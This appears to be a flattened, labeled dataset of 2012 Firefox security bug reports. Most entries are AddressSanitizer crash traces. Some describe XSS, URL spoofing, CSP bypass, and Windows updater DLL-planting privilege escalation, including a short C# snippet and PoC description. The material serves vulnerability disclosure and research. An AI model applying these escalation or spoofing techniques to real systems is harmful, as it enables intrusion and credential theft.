by 10131 calls stats 68m freed by 115413 calls stats 0m really freed by 0 calls stats 220m 56351 full pages mmaped in 55 calls mmaps by size class 8:180213 9:32764 10:12285 11:12282 12:2048 13:1536 14:1280 15:256 16:512 17:128 18:64 19:8 20:4 21:2 mallocs by size class 8:159655 9:26841 10:10317 11:11443 12:1809 13:1402 14:1249 15:204 16:479 17:123 18:57 19:6 20:4 21:2 frees by size class 8:75941 9:18459 10:7803 11:9347 12:1445 13:636 14:1116 15:170 16:364 17:115 18:11 19:4 20:2 rfrees by size class stats malloc large 192 small slow 1306 shadow byte and word 6 06 fb fb fb fb fb fb fb more shadow bytes 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 06 fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa	9
work around nvidia driver bug in glbufferdata thanks to ken/google for letting us know about this my understanding of is that the nvidia drivers have a bug glbufferdata with null data does n't actually allocate the buffer until actual data is uploaded to it this affects webgl we could work around this in 2 different places in webgl in webgl bufferdata and in the attrib 0 emulation code but instead i think that this is best handled at the level of glcontext	11
work around nvidia driver bug in glbufferdata thanks to ken/google for letting us know about this my understanding of is that the nvidia drivers have a bug glbufferdata with null data does n't actually allocate the buffer until actual data is uploaded to it this affects webgl we could work around this in 2 different places in webgl in webgl bufferdata and in the attrib 0 emulation code but instead i think that this is best handled at the level of glcontext	11
asan read heap-buffer-overflow in format-number asan trace 3077 error addresssanitizer heap-buffer-overflow on address at pc bp sp read of size 1 at thread t0 0 home/nicob/asan/firefox/firefox 1 home/nicob/asan/firefox/firefox 2 home/nicob/asan/firefox/firefox 3 home/nicob/asan/firefox/firefox 4 home/nicob/asan/firefox/firefox 5 home/nicob/asan/firefox/firefox is located 163 bytes to the left of 31-byte region allocated by thread t0 here 0 home/nicob/asan/firefox/firefox 1 home/nicob/asan/firefox/firefox 2 home/nicob/asan/firefox/firefox 3 home/nicob/asan/firefox/firefox 4 home/nicob/asan/firefox/firefox 5 home/nicob/asan/firefox/firefox tested versions firefox 11.0 windows xp 3 x86 firefox 12.0a1 linux x64 public asan build from choller/firefox/asan note the offset of the invalid read can be manipulated by modifying the divisor	11
problem with evalinsandbox and location this is related to bug 736537 if a code executed by evalinsandbox sets location.href nslocation checkurl gets the wrong subject principal since getcontextfromstack ignores a sandbox s js context and gets a js context on which a chrome code that calls evalinsandbox is running greasemonkey user scripts that access unsafewindow could be affected an attacker can perform an xss attack an attacker can steal a local file	11
possible arbitrary code execution by update service hi i notice two security issues in the new mozilla updater service which came with ff12 on windows i would like to report a the service path is not quoted which means you can end up with the potential for a planting attack e.g if you can create c program.exe it will run it when starting the service b the service itself can be tricked into loading a dll into the process with system privileges and it will run its dllmain meaning you can do anything you like you call loadlibrary instead of loadlibraryex on line 329 of workmonitor.cpp when checking that you have the correct resource string it should be called to only load it as a resource the following c code will run the service and will load a dll as long as the files c sourcecode\exploitme.dll and c sourcecode\updater.exe are the same the dll can then in dllmain run something like createprocess using system using system.serviceprocess namespace ffservice class program static void main string args try servicecontroller c new servicecontroller mozillamaintenance c.start new string aaa software-update c sourcecode\\exploitme.dll aaaa c sourcecode cccc catch exception e console.writeline e i have only tested in xp pro sp3 but i assume it will work on win7 and vista just the same if you need more information let me know james forshaw principal security consultant context information security registered no 3574635 certified to iso/iec 27001:2005 bsi certificate is 553326 and iso 9001:2008 bsi certificate fs 581360 www.contextis.com 30 marsh wall london e14 9tp uk mob 44 0 7827 248760 tel â 0207 537 7515 fax 0207 537 1071 the information contained in this email and any attachments may be legally privileged and confidential.â if you are not the intended recipient you are notified that disclosing copying distributing or taking any action in reliance on the contents of this information is strictly prohibited.â if you are not the intended recipient please contact us immediately.â any views or opinions presented in this email are solely those of the author and do not necessarily represent those of the company	11
use-after-free in nsinode replaceorinsertbefore use-after-free is triggered during replacing/inserting node in document crashes on 14.0a1 ubuntu 11.11 linux x86-64 15.0a1 windows 7 x86-64 12.0 windows xp sp3 does not crash on 10.0.2 attached test-case is a bit flaky but it will crash browser after 2-5 reloads asan log is from version 14.0a1	9
use-after-free in nsglobalwindow pagehidden heap-use-after-free caught on firefox 14.0a1 asan log attached unfortunately no poc at the moment will try to catch it again	9
updater.exe loads wsock32.dll from application directory user agent mozilla/5.0 windows nt 6.1 wow64 rv:12.0 gecko/20100101 firefox/12.0 build id 20120420145725 steps to reproduce the updater.exe from ff12 loads the wsock32.dll from the application directory during initialization this is an issue when combined with the maintenance service as it would allow an attacker to privilege escalate to local system without any prompts as it is the real updater.exe doing the loading it circumvents all the protections in place to ensure it is signed etc i have attached a poc which i have tested on win7 64bit with ff12 you need to extract the zip run the ffserver.exe file with the path to your installation of ff12 on the command line it should then start the maintenance service which should be enabled and it will run updater.exe this then loads the fake wsock32.dll from the current directory and a localsystem copy of calc should appear in the process list wsock32.dll is just a simple dll which runs calc in dllmain all it needed was to export oridinal 14 to ensure the loader loaded it actual results a fake wsock32.dll is loaded from the updater directory which loads into the local system privileged version of updater.exe at this point it is possible to do anything you like with elevated permissions expected results it should n't be loading from the current directory not that it has much choice	11
img onerror execute even when inline scripts are blocked by csp see i also reported this in person at the w3c webappsec working group face-to-face	2
heap-use-after-free read 8 in gfxtextrun getuserdata reproduces on trunk 20120517130245 6180 error addresssanitizer heap-use-after-free on address at pc bp sp read of size 8 at thread t0 0 in gfxtextrun getuserdata const src/modules/zlib/src/inffast.c:0 is located 56 bytes inside of 6712-byte region freed by thread t0 here 0 in free 1 in nstextframe cleartextruns src/layout/generic/nstextframe.h:432 previously allocated by thread t0 here 0 in malloc 1 in gfxtextrun allocatestoragefortextrun unsigned long unsigned int src/gfx/thebes/gfxfont.cpp:4290 6180 aborting stats 125m malloced 131m for red zones by 252339 calls stats 28m realloced by 12734 calls stats 85m freed by 119994 calls stats 0m really freed by 0 calls stats 292m 74798 full pages mmaped in 73 calls mmaps by size class 8:212979 9:40955 10:12285 11:12282 12:3072 13:2048 14:1536 15:384 16:576 17:96 18:144 19:40 20:16 mallocs by size class 8:191798 9:34053 10:9717 11:10403 12:2011 13:1813 14:1446 15:277 16:565 17:65 18:139 19:39 20:13 frees by size class 8:80912 9:21306 10:5944 11:7541 12:1292 13:971 14:1169 15:231 16:498 17:52 18:29 19:38 20:11 rfrees by size class stats malloc large 256 small slow 1500 shadow byte and word fd fd fd fd fd fd fd fd fd more shadow bytes fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd	11
object.defineproperty can shadow window.location yet another variant of bug 735073 bug 665548 and bug 541530 it is possible to shadow the location object using object.defineproperty verified with the current release build	11
history navigation error with late location.hash changes this is basically another flavor of bug 687745 the impact is identical it is possible to confuse the url navigation in the browser such that the user input on a victim site is redirected to a location on the attacker s server the bug exists in the history navigation which incorrectly handles calls to history.forward and history.back that are immediately followed by a write to location.hash suppose the history object is in the following state 0 active 1 calling history.forward on the attacker s website will redirect a user to the victim website if location.hash is set before the attacker s script is terminated the history object will be in the following state after opening 0 1 hash active there s a discrepancy between the displayed page/url bar and the address stored in history calling history.back will set baseuri back to thus all user input will be posted there but since that s only a hash change in the confused history object the page will not be reloaded and will still display the content of the victim s website the larry badge for https websites will also continue to show the victim s domain name although as daniel noted in bug 687745 comment 21 as a spoof it s on par with a typical phishing attack though with a convincing larry badge the attacker may delay the call to history.back until the user is busy filling out the forms the url shift is completely seamless and will not reset any input i ve implemented this in the poc as a 7 second delay between the loading of mozilla sync login page and navigating back to change the baseuri verified to work with the latest nightly 15.0a1 2012-05-21 and the release build 12.0	11
history navigation error with late location.hash changes this is basically another flavor of bug 687745 the impact is identical it is possible to confuse the url navigation in the browser such that the user input on a victim site is redirected to a location on the attacker s server the bug exists in the history navigation which incorrectly handles calls to history.forward and history.back that are immediately followed by a write to location.hash suppose the history object is in the following state 0 active 1 calling history.forward on the attacker s website will redirect a user to the victim website if location.hash is set before the attacker s script is terminated the history object will be in the following state after opening 0 1 hash active there s a discrepancy between the displayed page/url bar and the address stored in history calling history.back will set baseuri back to thus all user input will be posted there but since that s only a hash change in the confused history object the page will not be reloaded and will still display the content of the victim s website the larry badge for https websites will also continue to show the victim s domain name although as daniel noted in bug 687745 comment 21 as a spoof it s on par with a typical phishing attack though with a convincing larry badge the attacker may delay the call to history.back until the user is busy filling out the forms the url shift is completely seamless and will not reset any input i ve implemented this in the poc as a 7 second delay between the loading of mozilla sync login page and navigating back to change the baseuri verified to work with the latest nightly 15.0a1 2012-05-21 and the release build 12.0	11
asan heap-buffer-overflow at image rasterimage drawframeto this bug seems to be some sort of race condition the bug is fairly hard to reproduce but i was able to reproduce it with the files in the attached zip and with the build from d/try-linux64-debug/firefox-15.0a1.en-us.linux-x86_64.tar.bz2 asan report using build from d/try-linux64-debug/firefox-15.0a1.en-us.linux-x86_64.tar.bz2 31319 error addresssanitizer heap-buffer-overflow on address at pc bp sp read of size 4 at thread t0 0 in mozilla image rasterimage drawframeto imgframe imgframe nsintrect builds/slave/try-lnx64-dbg/build/image/src/rasterimage.cpp:2070 1 in mozilla image rasterimage docomposite nsintrect imgframe imgframe int builds/slave/try-lnx64-dbg/build/image/src/rasterimage.cpp:1885 2 in mozilla image rasterimage advanceframe mozilla timestamp nsintrect builds/slave/try-lnx64-dbg/build/image/src/rasterimage.cpp:369 3 in mozilla image rasterimage requestrefresh mozilla timestamp const builds/slave/try-lnx64-dbg/build/image/src/rasterimage.cpp:412 4 in nsrefreshdriver imagerequestenumerator nsisupportshashkey void builds/slave/try-lnx64-dbg/build/layout/base/nsrefreshdriver.cpp:454 5 in pl_dhashtableenumerate builds/slave/try-lnx64-dbg/build/obj-firefox/xpcom/build/pldhash.cpp:715 6 in nsthashtable nsisupportshashkey enumerateentries pldhashoperator nsisupportshashkey void void builds/slave/try-lnx64-dbg/build dist/include/nsthashtable.h:237 7 in nsrefreshdriver notify nsitimer builds/slave/try-lnx64-dbg/build/layout/base/nsrefreshdriver.cpp:410 8 in nstimerimpl fire builds/slave/try-lnx64-dbg/build/xpcom/threads/nstimerimpl.cpp:476 9 in nstimerevent run builds/slave/try-lnx64-dbg/build/xpcom/threads/nstimerimpl.cpp:559 10 in nsthread processnextevent bool bool builds/slave/try-lnx64-dbg/build/xpcom/threads/nsthread.cpp:624 11 in ns_processnextevent_p nsithread bool builds/slave/try-lnx64-dbg/build/obj-firefox/xpcom/build/nsthreadutils.cpp:213 12 in mozilla ipc messagepump run base messagepump delegate builds/slave/try-lnx64-dbg/build/ipc/glue/messagepump.cpp:113 13 in messageloop runinternal builds/slave/try-lnx64-dbg/build/ipc/chromium/src/base/message_loop.cc:209 14 in messageloop run builds/slave/try-lnx64-dbg/build/ipc/chromium/src/base/message_loop.cc:176 15 in nsbaseappshell run builds/slave/try-lnx64-dbg/build/widget/xpwidgets/nsbaseappshell.cpp:165 16 in nsappstartup run builds/slave/try-lnx64-dbg/build/toolkit/components/startup/nsappstartup.cpp:256 17 in xremain xre_mainrun builds/slave/try-lnx64-dbg/build/toolkit/xre/nsapprunner.cpp:3765 18 in xremain xre_main int char nsxreappdata const builds/slave/try-lnx64-dbg/build/toolkit/xre/nsapprunner.cpp:3842 19 in xre_main builds/slave/try-lnx64-dbg/build/toolkit/xre/nsapprunner.cpp:3918 20 in do_main int char builds/slave/try-lnx64-dbg/build/browser/app/nsbrowserapp.cpp:157 21 in main builds/slave/try-lnx64-dbg/build/browser/app/nsbrowserapp.cpp:244 22 in libc_start_main build/buildd/eglibc-2.13/csu/libc-start.c:258 is located 0 bytes to the right of 513-byte region allocated by thread t0 here 0 in malloc 0 1 in imgframe init int int int int gfxasurface gfximageformat unsigned char builds/slave/try-lnx64-dbg/build/image/src/imgframe.cpp:169 2 in mozilla image rasterimage internaladdframe unsigned int int int int int gfxasurface gfximageformat unsigned char unsigned char unsigned int unsigned int unsigned int builds/slave/try-lnx64-dbg/build/image/src/rasterimage.cpp:1044 3 in mozilla image rasterimage ensureframe unsigned int int int int int gfxasurface gfximageformat unsigned char unsigned char unsigned int unsigned int unsigned int builds/slave/try-lnx64-dbg/build/image/src/rasterimage.cpp:1145 4 in mozilla image nsgifdecoder2 beginimageframe unsigned short builds/slave/try-lnx64-dbg/build/image/decoders/nsgifdecoder2.cpp:185 5 in mozilla image nsgifdecoder2 writeinternal char const unsigned int builds/slave/try-lnx64-dbg/build/image/decoders/nsgifdecoder2.cpp:922 6 in mozilla image rasterimage writetodecoder char const unsigned int builds/slave/try-lnx64-dbg/build/image/src/rasterimage.cpp:2378 7 in mozilla image rasterimage decodesomedata unsigned int builds/slave/try-lnx64-dbg/build/image/src/rasterimage.cpp:2731 8 in mozilla image rasterimage decodeworker decodesomeofimage mozilla image rasterimage mozilla image rasterimage decodeworker decodetype builds/slave/try-lnx64-dbg/build/image/src/rasterimage.cpp:3028 9 in mozilla image rasterimage decodeworker run builds/slave/try-lnx64-dbg/build/image/src/rasterimage.cpp:2957 10 in nsthread processnextevent bool bool builds/slave/try-lnx64-dbg/build/xpcom/threads/nsthread.cpp:624 11 in ns_processnextevent_p nsithread bool builds/slave/try-lnx64-dbg/build/obj-firefox/xpcom/build/nsthreadutils.cpp:213 12 in mozilla ipc messagepump run base messagepump delegate builds/slave/try-lnx64-dbg/build/ipc/glue/messagepump.cpp:82 13 in messageloop runinternal builds/slave/try-lnx64-dbg/build/ipc/chromium/src/base/message_loop.cc:209 14 in messageloop run builds/slave/try-lnx64-dbg/build/ipc/chromium/src/base/message_loop.cc:176 15 in nsbaseappshell run builds/slave/try-lnx64-dbg/build/widget/xpwidgets/nsbaseappshell.cpp:165 16 in nsappstartup run builds/slave/try-lnx64-dbg/build/toolkit/components/startup/nsappstartup.cpp:256 17 in xremain xre_mainrun builds/slave/try-lnx64-dbg/build/toolkit/xre/nsapprunner.cpp:3765 18 in xremain xre_main int char nsxreappdata const builds/slave/try-lnx64-dbg/build/toolkit/xre/nsapprunner.cpp:3842 19 in xre_main builds/slave/try-lnx64-dbg/build/toolkit/xre/nsapprunner.cpp:3918 20 in do_main int char builds/slave/try-lnx64-dbg/build/browser/app/nsbrowserapp.cpp:157 21 in main builds/slave/try-lnx64-dbg/build/browser/app/nsbrowserapp.cpp:244 31319 aborting stats 1296m malloced 1238m for red zones by 2598427 calls stats 340m realloced by 249611 calls stats 1243m freed by 2350356 calls stats 1114m really freed by 2040296 calls stats 812m 208022 full pages mmaped in 203 calls mmaps by size class 8:442341 9:90101 10:28665 11:16376 12:5120 13:5120 14:2048 15:1024 16:1088 17:160 18:208 19:72 20:140 21:78 22:1 mallocs by size class 8:1938088 9:399426 10:123808 11:66502 12:21500 13:26796 14:10485 15:6225 16:4102 17:434 18:590 19:92 20:300 21:78 22:1 frees by size class 8:1733745 9:371387 10:116404 11:61308 12:20229 13:25807 14:9918 15:6176 16:3939 17:423 18:552 19:91 20:299 21:77 22:1 rfrees by size class 8:1508469 9:319321 10:101173 11:53186 12:17227 13:22292 14:8562 15:5231 16:3485 17:382 18:522 19:89 20:279 21:77 22:1 stats malloc large 1495 small slow 14726 shadow byte and word 1 01 fb fb fb fb fb fb fb more shadow bytes 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 01 fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa	11
arbitrary code execution using javascript url when javascript url is evaluated using a sandbox it s possible to run arbitrary code with the chrome privileges in xpc_evalinsandbox when calling js_valuetostring sandcx getjscontext v nsscriptsecuritymanager getprincipalandframe returns null which is treated as the system principal since there is no frame nor clamped principal and getscriptcontextprincipalfromjscontext cx returns null	2
arbitrary code execution using javascript url when javascript url is evaluated using a sandbox it s possible to run arbitrary code with the chrome privileges in xpc_evalinsandbox when calling js_valuetostring sandcx getjscontext v nsscriptsecuritymanager getprincipalandframe returns null which is treated as the system principal since there is no frame nor clamped principal and getscriptcontextprincipalfromjscontext cx returns null	2
out of bounds read in qcms_transform_data_rgb_out_lut_sse2 i received the following report from tony payne at google the attached profiles respectively trigger sigsegv when looking up the output value for r g or b when used as both the input and the output profile for test-transform.c	11
firefox ignores x-frame-options when set to sameorigin sameorigin duplicated header firefox ignores the x-frame-options sameorigin sameorigin header when the sameorigin value is duplicated some websites incorrectly have this duplicated header for some unknown reasons see e.g bug 761046 it would probably be fine to change the way nsdsuricontentlistener checkframeoptions parses this header to accept duplicated headers	2
use after free in js gc mapalloctotracekind reproduces on trunk 20120605092342 16916 error addresssanitizer global-buffer-overflow on address at pc bp sp read of size 4 at thread t2 0 in js gc mapalloctotracekind js gc allockind usr/local/google/home/aarya/firefox/src/js/src/jsfriendapi.cpp:0 1 in nsxmlhttprequest cyclecollection trace void void void char const void void usr/local/google/home/aarya/firefox/src/content/base/src/nsxmlhttprequest.cpp:663 2 in nsxhreventtarget cyclecollection traverse void nscyclecollectiontraversalcallback usr/local/google/home/aarya/firefox/src/content/base/src/nsxmlhttprequest.cpp:287 3 in nscyclecollector markroots gcgraphbuilder usr/local/google/home/aarya/firefox/src/xpcom/base/nscyclecollector.cpp:2054 4 in nscyclecollector begincollection nsicyclecollectorlistener usr/local/google/home/aarya/firefox/src/xpcom/base/nscyclecollector.cpp:2760 5 in nscyclecollectorrunner run usr/local/google/home/aarya/firefox/src/xpcom/base/nscyclecollector.cpp:3049 6 in nsthread processnextevent bool bool usr/local/google/home/aarya/firefox/src/xpcom/threads/nsthread.cpp:624 7 in ns_processnextevent_p nsithread bool usr/local/google/home/aarya/firefox/src/objdir-ff-asan/xpcom/build/nsthreadutils.cpp:213 8 in nsthread threadfunc void usr/local/google/home/aarya/firefox/src/xpcom/threads/nsthread.cpp:256 9 in pt_root usr/local/google/home/aarya/firefox/src/nsprpub/pr/src/pthreads/ptthread.c:158 is located 0 bytes to the right of global variable js gc mapalloctotracekind js gc allockind map usr/local/google/home/aarya/firefox/src/js/src/jsfriendapi.cpp of size 80 js gc mapalloctotracekind js gc allockind map usr/local/google/home/aarya/firefox/src/js/src/jsfriendapi.cpp is ascii string 16916 aborting stats 186m malloced 195m for red zones by 404853 calls stats 46m realloced by 21407 calls stats 156m freed by 274895 calls stats 24m really freed by 46335 calls stats 412m 105532 full pages mmaped in 103 calls mmaps by size class 8:311277 9:57337 10:24570 11:22517 12:4096 13:2560 14:1792 15:512 16:640 17:160 18:208 19:56 20:20 mallocs by size class 8:298456 9:55207 10:22104 11:19974 12:4008 13:2088 14:1570 15:393 16:638 17:146 18:196 19:55 20:18 frees by size class 8:188758 9:43497 10:18577 11:16765 12:2858 13:1836 14:1370 15:330 16:533 17:126 18:181 19:50 20:14 rfrees by size class 8:37269 9:2590 10:2242 11:3443 12:169 13:216 14:139 15:48 16:159 17:29 18:21 19:9 20:1 stats malloc large 415 small slow 2219 shadow byte and word f9 00 00 00 00 00 00 f9 f9 more shadow bytes 00 00 00 00 06 f9 f9 f9 f9 f9 f9 f9 05 f9 f9 f9 f9 f9 f9 f9 00 06 f9 f9 f9 f9 f9 f9 00 00 00 00 00 00 00 00 00 00 f9 f9 f9 f9 f9 f9 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00	11
memory corruption of strings user agent mozilla/5.0 macintosh intel mac os x 10_6_8 applewebkit/536.5 khtml like gecko chrome/19.0.1084.54 safari/536.5 steps to reproduce 1 load i ll also attach the test case but it requires dojo to run so the url is simpler 2 click the add another tab button repeatedly until the tabs overflow and a down arrow button appears on the upper right of the tabcontainer 3 repeatedly click the down arrow button to display a menu of tabs and click choices on the menu to navigate between tabs actual results eventually the menu tab navigation will stop working usually after two or three times in console firebug or builtin web console do this to see the root of the problem contenttabs.getchildren map function f return f.id join it shows corruption in the ids 17:15:15.289 acceptproposedco kanji-characters-etc-here bugzilla wo n't let me input them x00\x00\x00\x00\x00\x00₀a\x00\x00\x00\x00 note occurs on both mac and windows from version 8 to 14 and possibly earlier versions too expected results the id s should n't change they should be plain english strings 17:27:56.750 neweditorlayout1 neweditorlayout2 neweditorlayout3	11
heap-use-after-free in nsdocument adoptnode this bug reproduces quite frequently in my fuzzing however there is not reliable reproduction or minimized testcase the asan free and alloc stacks might be helpful in fixing the bug i will update bug if i get a reliable repro 20120613124512 26295 error addresssanitizer heap-use-after-free on address at pc bp sp read of size 8 at thread t0 0 in nstarray_base nstarraydefaultallocator length const firefox/src dist/include/nstarray.h:192 1 in adoptnodeintoownerdoc nsinode nsinode firefox/src/content/base/src/nsgenericelement.cpp:3743 2 in nsinode replaceorinsertbefore bool nsinode nsinode firefox/src/content/base/src/nsgenericelement.cpp:4346 3 in nsinode replaceorinsertbefore bool nsidomnode nsidomnode nsidomnode firefox/src/content/base/src/nsgenericelement.cpp:518 4 in deleteelementtxn undotransaction firefox/src/editor/libeditor/base/deleteelementtxn.cpp:159 5 in nstransactionitem undotransaction nstransactionmanager firefox/src/editor/txmgr/src/nstransactionitem.cpp:198 is located 272 bytes inside of 1376-byte region freed by thread t0 here 0 in free 1 in nsnodeutils lastrelease nsinode firefox/src/content/base/src/nsnodeutils.cpp:252 2 in nsdocument release firefox/src/content/base/src/nsdocument.cpp:1679 3 in nsnodeinfo release firefox/src/content/base/src/nsnodeinfo.cpp:185 4 in nsnodeutils cloneandadopt nsinode bool bool nsnodeinfomanager jscontext jsobject nscomarray nsinode nsidomnode firefox/src dist/include/nsnodeutils.h:272 5 in nsnodeutils adopt nsinode nsnodeinfomanager jscontext jsobject nscomarray nsinode firefox/src/content/base/src/nsnodeutils.h:172 6 in adoptnodeintoownerdoc nsinode nsinode firefox/src/content/base/src/nsgenericelement.cpp:3743 7 in nsinode replaceorinsertbefore bool nsinode nsinode firefox/src/content/base/src/nsgenericelement.cpp:4346 8 in nsinode replaceorinsertbefore bool nsidomnode nsidomnode nsidomnode firefox/src/content/base/src/nsgenericelement.cpp:518 9 in deleteelementtxn undotransaction firefox/src/editor/libeditor/base/deleteelementtxn.cpp:159 10 in nstransactionitem undotransaction nstransactionmanager firefox/src/editor/txmgr/src/nstransactionitem.cpp:198 previously allocated by thread t0 here 0 in malloc 1 in moz_xmalloc firefox/src/memory/mozalloc/mozalloc.cpp:54 2 in nscontentutils createdocument nsastring_internal const nsastring_internal const nsidomdocumenttype nsiuri nsiuri nsiprincipal nsiscriptglobalobject documentflavor nsidomdocument firefox/src/content/base/src/nscontentutils.cpp:4226 3 in nsidomdomimplementation_createdocument jscontext unsigned int js value firefox/src/objdir-ff-asan/js/xpconnect/src/dom_quickstubs.cpp:6262 4 in js invokekernel jscontext js callargs js maybeconstruct firefox/src/js/src/jscntxtinlines.h:395 5 in js interpret jscontext js stackframe js interpmode firefox/src/js/src/jsinterp.cpp:2435 6 in js runscript jscontext jsscript js stackframe firefox/src/js/src/jsinterp.cpp:267 7 in js executekernel jscontext jsscript jsobject js value const js executetype js stackframe js value firefox/src/js/src/jsinterp.cpp:455 8 in js execute jscontext jsscript jsobject js value firefox/src/js/src/jsinterp.cpp:492 9 in evaluateucscriptforprincipalscommon jscontext jsobject jsprincipals jsprincipals unsigned short const unsigned int char const unsigned int js value jsversion firefox/src/js/src/jsapi.cpp:5356 10 in js_evaluateucscriptforprincipalsversionorigin firefox/src/js/src/jsapi.cpp:5393 11 in nsjscontext evaluatestring nsastring_internal const jsobject nsiprincipal nsiprincipal char const unsigned int jsversion nsastring_internal bool firefox/src/dom/base/nsjsenvironment.cpp:1463 12 in nsglobalwindow runtimeouthandler nstimeout nsiscriptcontext firefox/src/dom/base/nsglobalwindow.cpp:9042 13 in nsglobalwindow runtimeout nstimeout firefox/src/dom/base/nsglobalwindow.cpp:9306 14 in nsglobalwindow timercallback nsitimer void firefox/src/dom/base/nsglobalwindow.cpp:9580 15 in nstimerimpl fire firefox/src/xpcom/threads/nstimerimpl.cpp:473 16 in nstimerevent run firefox/src/xpcom/threads/nstimerimpl.cpp:559 17 in nsthread processnextevent bool bool firefox/src/xpcom/threads/nsthread.cpp:624 18 in ns_processnextevent_p nsithread bool firefox/src/objdir-ff-asan/xpcom/build/nsthreadutils.cpp:216 19 in mozilla ipc messagepump run base messagepump delegate firefox/src/ipc/glue/messagepump.cpp:82 20 in messageloop run firefox/src/ipc/chromium/src/base/message_loop.cc:176 21 in nsbaseappshell run firefox/src/widget/xpwidgets/nsbaseappshell.cpp:165 22 in xremain xre_main int char nsxreappdata const firefox/src/toolkit/xre/nsapprunner.cpp:3858 26295 aborting stats 204m malloced 270m for red zones by 709938 calls stats 38m realloced by 47616 calls stats 171m freed by 456977 calls stats 61m really freed by 86648 calls stats 476m 121916 full pages mmaped in 119 calls mmaps by size class 8:540639 9:65528 10:45045 11:14329 12:4096 13:5120 14:1792 15:384 16:768 17:96 18:176 19:48 20:16 mallocs by size class 8:575429 9:63598 10:44465 11:14417 12:3815 13:5233 14:1576 15:345 16:719 17:97 18:183 19:47 20:14 frees by size class 8:346550 9:48317 10:40427 11:11219 12:2991 13:4933 14:1293 15:295 16:651 17:78 18:167 19:44 20:12 rfrees by size class 8:59414 9:12639 10:4862 11:6621 12:888 13:574 14:1048 15:152 16:347 17:45 18:25 19:32 20:1 stats malloc large 341 small slow 3125 shadow byte and word fd fd fd fd fd fd fd fd fd more shadow bytes fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd	11
out of bounds read in elementanimations ensurestylerulefor reproduces on trunk 32187 error addresssanitizer heap-buffer-overflow on address at pc bp sp read of size 4 at thread t0 0 in elementanimations ensurestylerulefor mozilla timestamp infallibletarray nsanimationmanager animationeventinfo firefox/src/layout/style/nsanimationmanager.cpp:274 1 in nsanimationmanager checkanimationrule nsstylecontext mozilla dom element firefox/src/layout/style/nsanimationmanager.cpp:518 2 in nsstyleset getcontext nsstylecontext nsrulenode nsrulenode bool bool nsiatom nscsspseudoelements type bool mozilla dom element firefox/src/layout/style/nsstyleset.cpp:618 3 in nsstyleset resolvestylefor mozilla dom element nsstylecontext treematchcontext firefox/src/layout/style/nsstyleset.cpp:953 4 in nscssframeconstructor resolvestylecontext nsstylecontext nsicontent nsframeconstructorstate firefox/src/layout/base/nscssframeconstructor.cpp:4546 5 in nscssframeconstructor resolvestylecontext nsiframe nsicontent nsframeconstructorstate firefox/src/layout/base/nscssframeconstructor.cpp:4533 6 in nscssframeconstructor addframeconstructionitems nsframeconstructorstate nsicontent bool nsiframe nscssframeconstructor frameconstructionitemlist firefox/src/layout/base/nscssframeconstructor.cpp:4986 7 in nscssframeconstructor contentappended nsicontent nsicontent bool firefox/src/layout/base/nscssframeconstructor.cpp:6552 8 in nscssframeconstructor createneededframes nsicontent firefox/src/layout/base/nscssframeconstructor.cpp:6244 9 in nscssframeconstructor createneededframes nsicontent firefox/src/layout/base/nscssframeconstructor.cpp:6256 10 in nscssframeconstructor createneededframes firefox/src/layout/base/nscssframeconstructor.cpp:6270 11 in presshell flushpendingnotifications mozflushtype firefox/src/layout/base/nspresshell.cpp:3813 12 in nsdocument flushpendingnotifications mozflushtype firefox/src/content/base/src/nsdocument.cpp:6297 13 in nsdocloader docloaderisempty bool firefox/src/uriloader/base/nsdocloader.cpp:775 14 in nsdocloader onstoprequest nsirequest nsisupports unsigned int firefox/src/uriloader/base/nsdocloader.cpp:704 15 in non-virtual thunk to nsdocloader onstoprequest nsirequest nsisupports unsigned int firefox/src/modules/zlib/src/inffast.c:0 16 in nsloadgroup removerequest nsirequest nsisupports unsigned int firefox/src/netwerk/base/src/nsloadgroup.cpp:698 17 in nsdocument dounblockonload firefox/src/content/base/src/nsdocument.cpp:7166 18 in nsdocument unblockonload bool firefox/src/content/base/src/nsdocument.cpp:7109 19 in nsdocument dispatchcontentloadedevents firefox/src/content/base/src/nsdocument.cpp:4180 20 in nsrunnablemethodimpl void nsdocument true run firefox/src dist/include/nsthreadutils.h:349 21 in nsthread processnextevent bool bool firefox/src/xpcom/threads/nsthread.cpp:625 22 in ns_processnextevent_p nsithread bool firefox/src/objdir-ff-asan-sym/xpcom/build/nsthreadutils.cpp:216 23 in nsxulwindow showmodal firefox/src/xpfe/appshell/src/nsxulwindow.cpp:378 24 in nscontenttreeowner showasmodal firefox/src/xpfe/appshell/src/nscontenttreeowner.cpp:529 25 in non-virtual thunk to nscontenttreeowner showasmodal firefox/src/modules/zlib/src/inffast.c:0 26 in nswindowwatcher openwindowjsinternal nsidomwindow char const char const char const bool nsiarray bool nsidomwindow firefox/src/embedding/components/windowwatcher/src/nswindowwatcher.cpp:1000 27 in nswindowwatcher openwindow nsidomwindow char const char const char const nsisupports nsidomwindow firefox/src/embedding/components/windowwatcher/src/nswindowwatcher.cpp:381 28 in ns_invokebyindex_p firefox/src/xpcom/reflect/xptcall/src/md/unix/xptcinvoke_x86_64_unix.cpp:161 29 in callmethodhelper invoke firefox/src/js/xpconnect/src/xpcwrappednative.cpp:3107 30 in xpc_wn_callmethod jscontext unsigned int js value firefox/src/js/xpconnect/src/xpcwrappednativejsops.cpp:1500 31 in js calljsnative jscontext int jscontext unsigned int js value js callargs const firefox/src/js/src/jscntxtinlines.h:395 32 in js interpret jscontext js stackframe js interpmode firefox/src/js/src/jsinterp.cpp:2435 33 in js runscript jscontext jsscript js stackframe 